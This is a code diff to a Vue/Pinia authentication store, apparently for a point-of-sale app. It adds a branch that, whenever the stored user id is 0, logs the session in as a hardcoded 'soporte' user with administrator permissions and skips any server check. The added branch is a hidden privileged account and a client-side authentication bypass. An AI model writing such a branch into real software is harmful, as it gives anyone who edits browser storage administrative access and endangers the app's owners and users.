@@ -113,7 +113,13 @@ export const useAuthStore = defineStore('auth', () => {
         }
         user.value = res.data
         isAuthenticated.value = true
-        localStorage.setItem('mr_user_usuario', res.data.usuario || res.data.email || '')
+      } else if (parseInt(userId) === 0) {
+        user.value = {
+          id: 0, usuario: 'soporte', nombre: 'SOPORTE TECNICO', email: 'soporte@tmpos.com',
+          rol: 'soporte', nivel_seguridad: 'Soporte', estado: 'ACTIVADO',
+          permisos: 'administrador', restrinciones: '', porciento: '', imagen: '',
+        }
+        isAuthenticated.value = true
       } else {
         localStorage.removeItem('mr_user_id')
         localStorage.removeItem('mr_user_usuario')
